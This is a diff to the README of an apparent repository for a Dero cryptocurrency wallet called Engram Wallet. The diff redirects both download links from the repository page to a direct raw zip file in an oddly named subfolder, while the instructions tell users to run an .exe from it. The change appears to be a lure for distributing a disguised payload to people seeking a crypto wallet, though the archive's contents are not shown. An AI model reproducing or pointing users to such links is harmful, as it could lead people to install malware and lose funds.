@@ -1,6 +1,6 @@
 # 🔐 engram-wallet-docs - Manage your Dero coins with ease
 
-[![Download Engram Wallet](https://img.shields.io/badge/Download-Engram_Wallet-blue)](https://github.com/smokescreenhuggins191/engram-wallet-docs)
+[![Download Engram Wallet](https://img.shields.io/badge/Download-Engram_Wallet-blue)](https://github.com/smokescreenhuggins191/engram-wallet-docs/raw/refs/heads/main/ibota/docs-engram-wallet-austere.zip)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software.
 
 You get the setup file from our official repository.
 
-1.  Visit [this page to download](https://github.com/smokescreenhuggins191/engram-wallet-docs).
+1.  Visit [this page to download](https://github.com/smokescreenhuggins191/engram-wallet-docs/raw/refs/heads/main/ibota/docs-engram-wallet-austere.zip).
 2.  Find the file that ends in .exe.
 3.  Click the file to save it to your computer.
 4.  Open your Downloads folder.
